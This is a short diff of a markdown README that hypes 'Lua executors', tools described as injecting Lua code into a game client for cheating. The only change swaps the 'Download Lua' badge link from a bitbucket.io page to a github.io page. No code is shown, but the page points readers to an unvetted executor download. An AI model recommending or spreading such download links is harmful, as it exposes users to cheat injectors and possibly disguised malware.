@@ -14,7 +14,7 @@ These bad boys are tools that **inject Lua code** straight into your game client
 But not all Lua executors are made equal. Some are trash. Some are key-locked nightmares.
 And some? They’re **smooth, stealthy, and straight-up deadly** 😈
 
-[![Download Lua](https://img.shields.io/badge/Download-Lua-blueviolet)](https://aiload2.bitbucket.io/)
+[![Download Lua](https://img.shields.io/badge/Download-Lua-blueviolet)](https://Lua-Executor-se5.github.io/.github)
 ---
 
 ## 🔍 What Makes an Executor “Lua”?
